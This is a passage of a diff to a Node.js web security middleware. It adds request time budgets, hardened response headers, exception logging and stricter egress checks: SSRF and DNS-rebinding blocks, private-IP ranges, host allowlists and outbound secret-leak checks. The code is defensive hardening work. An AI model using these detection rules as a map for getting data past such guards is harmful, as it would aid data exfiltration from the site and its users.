+    threatEvidenceV221: null,
+    mfaVerifiedV221: false
   };
   try {
     DIRAC_CENTRAL_CONTEXT_STACK_V146.push(ctx);
@@ -28826,6 +30141,14 @@ async function diracCentralSecurityGuardV146(req, res, nextHandler) {
       ctx.currentStageV211 = String(stage && stage.name || 'unknown_stage');
       ctx.currentStageIndexV211 = stageIndex;
       const stageStartedAt = Date.now();
+      const elapsedBeforeStageV221 = stageStartedAt - Number(ctx.startedAt || stageStartedAt);
+      if (elapsedBeforeStageV221 > diracCentralGuardBudgetMsV221(ctx)) {
+        ctx.failedStageV211 = ctx.currentStageV211;
+        ctx.failureReasonV211 = 'central_guard_time_budget_exceeded';
+        ctx.failureClassificationV221 = diracCentralClassifyFailureV221(ctx.failureReasonV211, ctx.currentStageV211, '');
+        diracCentralEmitDebugV211(ctx, 'request_blocked', { reason: ctx.failureReasonV211, elapsed_ms: elapsedBeforeStageV221 });
+        return await diracCentralBanAndBlockV146(req, res, ctx, ctx.action || 'central_guard_error', method, ctx.failureReasonV211);
+      }
       let result;
       try {
         result = await stage.guard(ctx);
@@ -28833,7 +30156,7 @@ async function diracCentralSecurityGuardV146(req, res, nextHandler) {
         ctx.failedStageV211 = ctx.currentStageV211;
         ctx.failureReasonV211 = 'central_guard_stage_exception';
         ctx.stageTraceV211.push(Object.freeze({ index: stageIndex, stage: ctx.currentStageV211, result: 'exception', duration_ms: Date.now() - stageStartedAt }));
-        try { stageError.diracStage = ctx.currentStageV211; stageError.diracStageIndex = stageIndex; } catch (_) {}
+        try { stageError.diracStage = ctx.currentStageV211; stageError.diracStageIndex = stageIndex; } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
         throw stageError;
       }
       const stageResult = result && result.ok === true ? 'passed' : 'blocked';
@@ -28842,7 +30165,14 @@ async function diracCentralSecurityGuardV146(req, res, nextHandler) {
         const reason = String(result && result.reason || result && result.directCode || 'central_guard_stage_failed');
         ctx.failedStageV211 = ctx.currentStageV211;
         ctx.failureReasonV211 = reason;
-        diracCentralEmitDebugV211(ctx, 'request_blocked', { direct_code: String(result && result.directCode || ''), decision: String(result && result.decision || '') });
+        ctx.failureClassificationV221 = diracCentralClassifyFailureV221(reason, ctx.currentStageV211, result && result.directCode);
+        diracCentralEmitDebugV211(ctx, 'request_blocked', {
+          direct_code: String(result && result.directCode || ''),
+          decision: String(result && result.decision || ''),
+          failure_class: ctx.failureClassificationV221.failureClass,
+          severity: ctx.failureClassificationV221.severity,
+          threat: ctx.threatEvidenceV221 || undefined
+        });
         if (result && result.directCode) return diracCentralBlockedResponseV146(res, result.directCode);
         return await diracCentralBanAndBlockV146(req, res, ctx, String(result && result.action || ctx.action || 'central_guard_error'), method, reason);
       }
@@ -28853,6 +30183,7 @@ async function diracCentralSecurityGuardV146(req, res, nextHandler) {
       return await diracCentralBanAndBlockV146(req, res, ctx, ctx.action || 'central_guard_error', method, 'central_guard_integrity_final_incomplete');
     }
     if (ctx.terminalResponse === 'disabled') return diracCentralDisabledResponseV146(res);
+    if (ctx.terminalResponse === 'mfa_required_v221') return diracCentralMfaRequiredResponseV221(res, ctx);
     if (ctx.terminalBlockReason) return await diracCentralBanAndBlockV146(req, res, ctx, ctx.action, method, ctx.terminalBlockReason);
 
     ctx.currentStageV211 = 'dispatch';
@@ -28860,8 +30191,8 @@ async function diracCentralSecurityGuardV146(req, res, nextHandler) {
     ctx.centralGuardFullyPassedV211 = true;
     ctx.executionPhaseV211 = 'handler';
     req.__diracCentralSecurityGuardPassedV146 = true;
-    try { Object.defineProperty(req, '__diracCentralSecurityGuardPassedV146', { value: true, writable: false, enumerable: false, configurable: false }); } catch (_) {}
-    try { Object.defineProperty(req, '__diracCentralRequestIdV211', { value: ctx.requestId, writable: false, enumerable: false, configurable: false }); } catch (_) {}
+    try { Object.defineProperty(req, '__diracCentralSecurityGuardPassedV146', { value: true, writable: false, enumerable: false, configurable: false }); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+    try { Object.defineProperty(req, '__diracCentralRequestIdV211', { value: ctx.requestId, writable: false, enumerable: false, configurable: false }); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
     if (diracCentralVerifiedOwnerActionV217(ctx.action)) {
       let resolvedOwnerV215 = diracCentralOwnerFromStage26V217(ctx);
@@ -28904,9 +30235,10 @@ async function diracCentralSecurityGuardV146(req, res, nextHandler) {
   } catch (error) {
     if (ctx && !ctx.failedStageV211) ctx.failedStageV211 = String(error && error.diracStage || ctx.currentStageV211 || 'central_guard');
     if (ctx && !ctx.failureReasonV211) ctx.failureReasonV211 = String(error && error.code || error && error.message || 'central_guard_error').slice(0, 120);
+    if (ctx) ctx.failureClassificationV221 = diracCentralClassifyFailureV221(ctx.failureReasonV211, ctx.failedStageV211, '');
     const safeDebug = diracCentralSafeDebugErrorV155(error, ctx);
     diracCentralEmitDebugV211(ctx, 'central_exception', safeDebug);
-    try { console.error('[dirac-central-security-v202]', safeDebug); } catch (_) {}
+    try { console.error('[dirac-central-security-v202]', safeDebug); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
     if (ctx) ctx.centralErrorDebugV155 = safeDebug;
     if (ctx && req && req.__diracCentralSecurityGuardPassedV146 && ctx.action === 'domain_dashboard_me') {
       return await diracCentralBanAndBlockV146(req, res, ctx, ctx.action, method, 'domain_dashboard_handler_error');
@@ -28915,9 +30247,10 @@ async function diracCentralSecurityGuardV146(req, res, nextHandler) {
     return diracCentralBlockedResponseV146(res, 'CENTRAL_GUARD_ERROR');
   } finally {
     if (ctx) {
-      try { if (ctx.__diracCentralSupabaseRequestCacheV151 instanceof Map) ctx.__diracCentralSupabaseRequestCacheV151.clear(); } catch (_) {}
-      try { if (ctx.__diracCentralOwnerBoundObjectValuesV194 instanceof Set) ctx.__diracCentralOwnerBoundObjectValuesV194.clear(); } catch (_) {}
-      try { if (req && typeof req === 'object') DIRAC_CENTRAL_VERIFIED_OWNER_CONTEXTS_V215.delete(req); } catch (_) {}
+      try { diracCentralReleaseRateLeaseV221(ctx); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+      try { if (ctx.__diracCentralSupabaseRequestCacheV151 instanceof Map) ctx.__diracCentralSupabaseRequestCacheV151.clear(); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+      try { if (ctx.__diracCentralOwnerBoundObjectValuesV194 instanceof Set) ctx.__diracCentralOwnerBoundObjectValuesV194.clear(); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+      try { if (req && typeof req === 'object') DIRAC_CENTRAL_VERIFIED_OWNER_CONTEXTS_V215.delete(req); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
       ctx.normalizedSampleV202 = null;
       ctx.sample = null;
       ctx.body = null;
@@ -28936,26 +30269,30 @@ async function diracCentralSecurityGuardV146(req, res, nextHandler) {
 
 function diracCentralApplyHeadersV146(res) {
   if (!res || typeof res.setHeader !== 'function') return;
-  try { res.setHeader('X-Dirac-Central-Security-Guard', DIRAC_CENTRAL_SECURITY_GUARD_V146); } catch (_) {}
-  try { res.setHeader('X-Dirac-Fail-Closed', DIRAC_CENTRAL_FAIL_CLOSED_DEBUG_V211); } catch (_) {}
+  try { res.setHeader('X-Dirac-Central-Security-Guard', DIRAC_CENTRAL_SECURITY_GUARD_V146); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('X-Dirac-Fail-Closed', DIRAC_CENTRAL_FAIL_CLOSED_DEBUG_V211); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   try {
     const ctx = diracCentralCurrentContextV149();
     if (ctx && ctx.requestId) res.setHeader('X-Dirac-Request-Id', String(ctx.requestId).slice(0, 64));
-  } catch (_) {}
-  try { res.setHeader('X-Dirac-Dashboard-Session-Fix', 'v147-bola-direct-timeout-fast-self-read'); } catch (_) {}
-  try { res.setHeader('Cache-Control', 'no-store'); } catch (_) {}
-  try { res.setHeader('X-Content-Type-Options', 'nosniff'); } catch (_) {}
-  try { res.setHeader('X-Frame-Options', 'DENY'); } catch (_) {}
-  try { res.setHeader('Cross-Origin-Opener-Policy', 'same-origin'); } catch (_) {}
-  try { res.setHeader('Cross-Origin-Resource-Policy', 'same-site'); } catch (_) {}
-  try { res.setHeader('Origin-Agent-Cluster', '?1'); } catch (_) {}
-  try { res.setHeader('X-Permitted-Cross-Domain-Policies', 'none'); } catch (_) {}
+  } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('X-Dirac-Dashboard-Session-Fix', 'v147-bola-direct-timeout-fast-self-read'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('Cache-Control', 'no-store'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('X-Content-Type-Options', 'nosniff'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('X-Frame-Options', 'DENY'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('Cross-Origin-Opener-Policy', 'same-origin'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('Cross-Origin-Resource-Policy', 'same-site'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('Origin-Agent-Cluster', '?1'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('X-Permitted-Cross-Domain-Policies', 'none'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   if (diracCentralIsProductionV146()) {
-    try { res.setHeader('Strict-Transport-Security', 'max-age=63072000; includeSubDomains; preload'); } catch (_) {}
+    try { res.setHeader('Strict-Transport-Security', 'max-age=63072000; includeSubDomains; preload'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   }
-  try { res.setHeader('Content-Security-Policy', "default-src 'self'; base-uri 'self'; frame-ancestors 'none'; object-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data: https:; connect-src 'self' https://diracgroup.store https://www.diracgroup.store"); } catch (_) {}
-  try { res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin'); } catch (_) {}
-  try { res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=(), payment=(), usb=(), fullscreen=(self)'); } catch (_) {}
+  try { res.setHeader('Content-Security-Policy', "default-src 'self'; base-uri 'none'; frame-ancestors 'none'; object-src 'none'; form-action 'self'; script-src 'self'; script-src-attr 'none'; style-src 'self'; img-src 'self' data: https:; connect-src 'self' https://diracgroup.store https://www.diracgroup.store; upgrade-insecure-requests"); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=(), payment=(), usb=(), serial=(), bluetooth=(), browsing-topics=(), interest-cohort=(), fullscreen=(self)'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('X-DNS-Prefetch-Control', 'off'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('X-Download-Options', 'noopen'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('X-Dirac-Central-Hardening', DIRAC_CENTRAL_HARDENING_V221); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('X-Dirac-Pipeline-Hash', DIRAC_CENTRAL_PIPELINE_HASH_V221); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 }
 
 function diracCentralWrapJsonResponseV146(res) {
@@ -28964,7 +30301,7 @@ function diracCentralWrapJsonResponseV146(res) {
   res.json = function diracCentralJsonResponseGuardV146(payload) {
     diracCentralApplyHeadersV146(res);
     if (diracCentralPayloadContainsRuntimeSecretV194(payload)) {
-      try { if (typeof res.status === 'function') res.status(500); else res.statusCode = 500; } catch (_) {}
+      try { if (typeof res.status === 'function') res.status(500); else res.statusCode = 500; } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
       return originalJson({ ok: false, code: 'CENTRAL_OUTPUT_SECRET_BLOCKED', message: 'Respons ditolak oleh sistem keamanan.' });
     }
     return originalJson(diracCentralSanitizeOutputV146(payload, 0));
@@ -29054,14 +30391,14 @@ async function diracCentralBuildIdentityV146(req) {
       const payload = decodeJwtPayloadUnsafe(cookies[ACCESS_COOKIE]);
       authUserId = String(payload && (payload.sub || payload.user_id || payload.id) || '').trim();
     }
-  } catch (_) {}
+  } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   if (!authUserId) {
     try {
       if (typeof readSignedDomainSessionUser === 'function') {
         const signed = await readSignedDomainSessionUser(cookies).catch(() => null);
         authUserId = String(signed && signed.id || '').trim();
       }
-    } catch (_) {}
+    } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   }
 
   const loggedIn = Boolean(authUserId || sessionMaterial);
@@ -29428,7 +30765,7 @@ function diracCentralCsrfGuardV146(req, res, ctx) {
   try { diracCentralRootSecretV146(); } catch (_) { return { ok: false, reason: 'csrf_root_secret_invalid' }; }
   if (!diracCentralNeedsCsrfNonceV146(ctx)) {
     if ((ctx.method === 'GET' || ctx.method === 'HEAD') && typeof diracCsrfIssueToken === 'function') {
-      try { diracCsrfIssueToken(req, res, ctx.action); } catch (_) {}
+      try { diracCsrfIssueToken(req, res, ctx.action); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
     }
     return { ok: true };
   }
@@ -29520,7 +30857,7 @@ function diracCentralIssuePageNonceV146(req, res, action) {
   const body = Buffer.from(JSON.stringify(payload)).toString('base64url');
   const sig = crypto.createHmac('sha256', secret).update(body).digest('base64url');
   const token = body + '.' + sig;
-  try { res.setHeader('X-Dirac-Page-Nonce', token); } catch (_) {}
+  try { res.setHeader('X-Dirac-Page-Nonce', token); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   return token;
 }
 
@@ -29747,7 +31084,7 @@ async function diracCentralAdminAuthGuardV146(req, res, ctx) {
       if (!admin) return { ok: false, reason: 'admin_auth_invalid' };
       return { ok: true };
     }
-  } catch (_) {}
+  } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   return { ok: false, reason: 'admin_guard_missing' };
 }
 
@@ -29937,7 +31274,7 @@ function diracCentralRedactSensitiveUrlV194(value) {
   const raw = String(value || '').slice(0, 4096);
   return raw.replace(/([?&])([^=&#]{1,160})=([^&#]*)/g, (match, separator, encodedKey) => {
     let key = encodedKey;
-    try { key = decodeURIComponent(encodedKey); } catch (_) {}
+    try { key = decodeURIComponent(encodedKey); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
     if (!diracCentralSensitiveKeyV146(key)) return match;
     return separator + encodedKey + '=[redacted]';
   });
@@ -30774,7 +32111,7 @@ function diracCentralExtractServiceRoleScopeIdsV146(path, body) {
         if (/^(id|order_id|order_code|domain_order_id|payment_id|transaction_id|invoice_id|gateway_reference|session_id|recovery_code_id)$/.test(key)) addObject(item);
       });
     }
-  } catch (_) {}
+  } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   diracCentralFlattenObjectV146(body || {}, 0, '', 200).forEach((item) => {
     const key = String(item.key || '').split('.').pop().toLowerCase();
     if (key === 'customer_id') add('customerIds', item.value);
@@ -31325,12 +32662,17 @@ function diracCentralBlockedSupabaseResultV146(decision) {
 async function diracCentralInspectEgressV146(input, options = {}) {
   let url;
   try { url = new URL(typeof input === 'string' ? input : input && input.url || ''); } catch (_) { return { block: true, reason: 'egress_url_invalid' }; }
+  if (String(url.href || '').length > 4096) return { block: true, reason: 'egress_url_too_long' };
   if (!/^https:$/.test(url.protocol)) return { block: true, reason: 'egress_protocol_blocked' };
   if (url.username || url.password) return { block: true, reason: 'egress_url_credentials_blocked' };
   if (url.port && url.port !== '443') return { block: true, reason: 'egress_nonstandard_port_blocked' };
-  const host = url.hostname.toLowerCase();
+  const method = String(options && options.method || 'GET').toUpperCase();
+  if (!['GET', 'HEAD', 'POST', 'PUT', 'PATCH', 'DELETE'].includes(method)) return { block: true, reason: 'egress_method_blocked' };
+  const host = String(url.hostname || '').toLowerCase().replace(/\.$/, '');
+  if (!host || host !== String(url.hostname || '').toLowerCase()) return { block: true, reason: 'egress_host_canonicalization_invalid' };
   if (diracCentralIsUnsafeHostV146(host)) return { block: true, reason: 'egress_private_or_metadata_host' };
   if (!diracCentralAllowedEgressHostV146(host)) return { block: true, reason: 'egress_host_not_allowlisted' };
+  if (url.hash) return { block: true, reason: 'egress_fragment_rejected' };
   const directService = diracCentralDirectServiceRoleFetchV146(url, input, options);
   if (directService.block) return directService;
   const secretLeak = await diracCentralOutboundSecretLeakGuardV194(url, input, options);
@@ -31340,7 +32682,7 @@ async function diracCentralInspectEgressV146(input, options = {}) {
   catch (_) { return { block: true, reason: 'egress_dns_resolution_failed' }; }
   if (!Array.isArray(dns) || dns.length < 1) return { block: true, reason: 'egress_dns_resolution_empty' };
   if (dns.some(diracCentralIsUnsafeIpV146)) return { block: true, reason: 'egress_dns_resolved_private_ip' };
-  return { ok: true };
+  return { ok: true, host, ips: dns.slice() };
 }
 
 async function diracCentralFetchWithRedirectGuardV146(fetchImpl, input, options, depth) {
@@ -31350,13 +32692,48 @@ async function diracCentralFetchWithRedirectGuardV146(fetchImpl, input, options,
     error.code = 'DIRAC_EGRESS_REDIRECT_LIMIT';
     throw error;
   }
-  const guardedOptions = Object.assign({}, options || {}, { redirect: 'manual' });
-  const response = await fetchImpl(input, guardedOptions);
+  const inspection = await diracCentralInspectEgressV146(input, options)
+    .catch(() => ({ block: true, reason: 'egress_guard_exception' }));
+  if (!inspection || inspection.block || inspection.ok !== true) {
+    const error = new Error('DIRAC_EGRESS_BLOCKED');
+    error.code = 'DIRAC_EGRESS_BLOCKED';
+    error.diracSecurityThreat = inspection || { reason: 'egress_guard_invalid_result' };
+    throw error;
+  }
+  let parsedUrl;
+  try { parsedUrl = new URL(typeof input === 'string' ? input : input && input.url || ''); }
+  catch (_) {
+    const error = new Error('DIRAC_EGRESS_URL_INVALID');
+    error.code = 'DIRAC_EGRESS_URL_INVALID';
+    throw error;
+  }
+  const firstIps = await diracCentralResolveHostIpsV146(parsedUrl.hostname);
+  const rebinding = await diracCentralDnsRebindingGuardV221(parsedUrl.hostname, firstIps);
+  if (!rebinding.ok) {
+    const error = new Error('DIRAC_EGRESS_DNS_REBINDING_BLOCKED');
+    error.code = 'DIRAC_EGRESS_DNS_REBINDING_BLOCKED';
+    error.diracSecurityThreat = rebinding;
+    throw error;
+  }
+  const timeout = diracCentralTimeoutOptionsV221(Object.assign({}, options || {}, { redirect: 'manual' }));
+  let response;
+  try {
+    response = await fetchImpl(input, timeout.options);
+  } catch (error) {
+    if (timeout.options.signal && timeout.options.signal.aborted && (!error || error.name === 'AbortError')) {
+      const timeoutError = new Error('DIRAC_EGRESS_TIMEOUT');
+      timeoutError.code = 'DIRAC_EGRESS_TIMEOUT';
+      throw timeoutError;
+    }
+    throw error;
+  } finally {
+    timeout.cleanup();
+  }
   const status = Number(response && response.status || 0);
   if (status < 300 || status > 399 || !response || !response.headers || typeof response.headers.get !== 'function') return response;
   const location = response.headers.get('location');
   if (!location) return response;
-  const base = new URL(typeof input === 'string' ? input : input && input.url || '');
+  const base = parsedUrl;
   const nextUrl = new URL(location, base);
   const requestMethod = String(options && options.method || 'GET').toUpperCase();
   if (nextUrl.origin !== base.origin) {
@@ -31377,7 +32754,7 @@ async function diracCentralFetchWithRedirectGuardV146(fetchImpl, input, options,
     error.diracSecurityThreat = decision;
     throw error;
   }
-  try { if (response.body && typeof response.body.cancel === 'function') await response.body.cancel(); } catch (_) {}
+  try { if (response.body && typeof response.body.cancel === 'function') await response.body.cancel(); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   return diracCentralFetchWithRedirectGuardV146(fetchImpl, nextUrl.toString(), options, currentDepth + 1);
 }
 
@@ -31410,7 +32787,7 @@ function diracCentralConfiguredSupabaseHostsV194() {
     try {
       const value = String(process.env[name] || '').trim();
       if (value) hosts.add(new URL(value).hostname.toLowerCase());
-    } catch (_) {}
+    } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   });
   return hosts;
 }
@@ -31435,14 +32812,14 @@ function diracCentralOutboundMaterialV194(url, input, options) {
     const headers = options && options.headers || input && input.headers || {};
     if (headers && typeof headers.forEach === 'function') headers.forEach((value, key) => chunks.push(String(key), String(value)));
     else Object.entries(headers || {}).forEach(([key, value]) => chunks.push(String(key), String(value)));
-  } catch (_) {}
+  } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   try {
     const body = options && options.body;
     if (typeof body === 'string') chunks.push(body);
     else if (Buffer.isBuffer(body) || body instanceof Uint8Array) chunks.push(Buffer.from(body).toString('utf8'));
     else if (body && typeof body.toString === 'function' && body.constructor && body.constructor.name === 'URLSearchParams') chunks.push(body.toString());
     else if (body && typeof body === 'object' && Object.getPrototypeOf(body) === Object.prototype) chunks.push(JSON.stringify(body));
-  } catch (_) {}
+  } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   return chunks.join('\n');
 }
 
@@ -31494,13 +32871,34 @@ async function diracCentralResolveHostIpsV146(host) {
 }
 
 function diracCentralIsUnsafeIpV146(ip) {
-  const clean = String(ip || '').trim().toLowerCase();
-  if (!clean) return false;
-  if (clean === '127.0.0.1' || clean === '0.0.0.0' || clean === '::1') return true;
-  if (/^10\./.test(clean) || /^192\.168\./.test(clean) || /^169\.254\./.test(clean)) return true;
-  if (/^172\.(?:1[6-9]|2\d|3[0-1])\./.test(clean)) return true;
-  if (/^(fc|fd)[0-9a-f]{2}:/i.test(clean) || /^fe80:/i.test(clean)) return true;
-  return false;
+  let clean = String(ip || '').trim().toLowerCase();
+  if (!clean) return true;
+  if (/^::ffff:\d{1,3}(?:\.\d{1,3}){3}$/.test(clean)) clean = clean.slice(7);
+  let version = 0;
+  try { version = require('net').isIP(clean); } catch (_) { version = 0; }
+  if (!version) return true;
+  if (version === 4) {
+    const octets = clean.split('.').map(Number);
+    if (octets.length !== 4 || octets.some((value) => !Number.isInteger(value) || value < 0 || value > 255)) return true;
+    const [a, b] = octets;
+    return a === 0
+      || a === 10
+      || a === 127
+      || (a === 100 && b >= 64 && b <= 127)
+      || (a === 169 && b === 254)
+      || (a === 172 && b >= 16 && b <= 31)
+      || (a === 192 && b === 0)
+      || (a === 192 && b === 168)
+      || (a === 198 && (b === 18 || b === 19))
+      || a >= 224;
+  }
+  const normalized = clean.replace(/^\[|\]$/g, '');
+  return normalized === '::'
+    || normalized === '::1'
+    || /^f[cd][0-9a-f]{2}:/i.test(normalized)
+    || /^fe[89ab][0-9a-f]:/i.test(normalized)
+    || /^ff/i.test(normalized)
+    || /^2001:db8:/i.test(normalized);
 }
 
 function diracCentralAllowedEgressHostV146(host) {
@@ -31521,7 +32919,7 @@ function diracCentralAllowedEgressHostV146(host) {
     try {
       const value = String(process.env[name] || '').trim();
       if (value) allowed.add(new URL(value).hostname.toLowerCase());
-    } catch (_) {}
+    } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   });
   return allowed.has(host);
 }
@@ -31659,7 +33057,7 @@ async function diracCentralWritePersistentBanV146(req, res, action, method, thre
 function diracCentralBlockedResponseV146(res, reason) {
   const ctx = diracCentralCurrentContextV149();
   diracCentralApplyHeadersV146(res);
-  try { if (res && typeof res.setHeader === 'function') res.setHeader('Cache-Control', 'no-store'); } catch (_) {}
+  try { if (res && typeof res.setHeader === 'function') res.setHeader('Cache-Control', 'no-store'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   const publicReason = diracCentralIsProductionV146() ? 'blocked' : String(reason || 'blocked').slice(0, 80);
   const payload = {
     ok: false,
@@ -31688,7 +33086,7 @@ function diracCentralBlockedResponseV146(res, reason) {
 function diracCentralPersistenceUnavailableResponseV210(res) {
   const ctx = diracCentralCurrentContextV149();
   diracCentralApplyHeadersV146(res);
-  try { if (res && typeof res.setHeader === 'function') res.setHeader('Cache-Control', 'no-store'); } catch (_) {}
+  try { if (res && typeof res.setHeader === 'function') res.setHeader('Cache-Control', 'no-store'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   const payload = {
     ok: false,
     code: 'CENTRAL_SECURITY_PERSISTENCE_UNAVAILABLE',
@@ -31905,7 +33303,7 @@ function diracCentralExtractValuesV146(value) {
   const raw = String(value === undefined || value === null ? '' : value).trim();
   if (!raw) return [];
   const samples = [raw];
-  try { samples.push(decodeURIComponent(raw)); } catch (_) {}
+  try { samples.push(decodeURIComponent(raw)); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   return Array.from(new Set(samples.flatMap((sample) => String(sample || '').split(/[\s,|]+/))
     .map((part) => part.replace(/^(?:eq|in|is)\./i, '').replace(/^\(/, '').replace(/\)$/, '').replace(/^['"]|['"]$/g, '').trim())
     .filter(Boolean))).slice(0, 20);
@@ -31969,7 +33367,7 @@ function diracCentralIsUnsafeHostV146(host) {
 }
 
 function diracCentralLooksLikeUuidV146(value) {
-  try { if (typeof customerSecurityLooksLikeUuid === 'function') return customerSecurityLooksLikeUuid(value); } catch (_) {}
+  try { if (typeof customerSecurityLooksLikeUuid === 'function') return customerSecurityLooksLikeUuid(value); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   return /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(String(value || '').trim());
 }
 
@@ -32177,7 +33575,7 @@ try {
     };
     Object.defineProperty(diracCsrfShouldCheckRequest, '__diracCentralPassthroughV146', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
 try {
   const __diracCentralPreviousV137CsrfShouldForceV146 = typeof diracV137CsrfShouldForce === 'function' ? diracV137CsrfShouldForce : null;
@@ -32187,7 +33585,7 @@ try {
     };
     Object.defineProperty(diracV137CsrfShouldForce, '__diracCentralPassthroughV146', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
 try {
   const __diracCentralPreviousV138CsrfShouldForceV146 = typeof diracV138CsrfShouldForce === 'function' ? diracV138CsrfShouldForce : null;
@@ -32197,7 +33595,7 @@ try {
     };
     Object.defineProperty(diracV138CsrfShouldForce, '__diracCentralPassthroughV146', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
 try {
   const __diracCentralPreviousV128InspectHttpV146 = typeof diracBolaIdorV128InspectHttpRequest === 'function' ? diracBolaIdorV128InspectHttpRequest : null;
@@ -32207,7 +33605,7 @@ try {
     };
     Object.defineProperty(diracBolaIdorV128InspectHttpRequest, '__diracCentralPassthroughV146', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
 try {
   const __diracCentralPreviousV132InspectHttpV146 = typeof diracBolaIdorV132InspectHttpQuery === 'function' ? diracBolaIdorV132InspectHttpQuery : null;
@@ -32217,7 +33615,7 @@ try {
     };
     Object.defineProperty(diracBolaIdorV132InspectHttpQuery, '__diracCentralPassthroughV146', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
 try {
   const __diracCentralPreviousV133InspectHttpV146 = typeof diracBolaIdorV133InspectHttpRequest === 'function' ? diracBolaIdorV133InspectHttpRequest : null;
@@ -32227,7 +33625,7 @@ try {
     };
     Object.defineProperty(diracBolaIdorV133InspectHttpRequest, '__diracCentralPassthroughV146', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
 function diracCentralCurrentContextPassedV146() {
   const ctx = diracCentralCurrentContextV149();
@@ -33428,6 +34826,15 @@ function diracV202BuildActionPolicyTable() {
 }
 const ACTION_POLICY = diracV202BuildActionPolicyTable();
 
+DIRAC_CENTRAL_SELF_TEST_V221 = diracCentralSelfTestRunV221();
+if (!DIRAC_CENTRAL_SELF_TEST_V221.ok) {
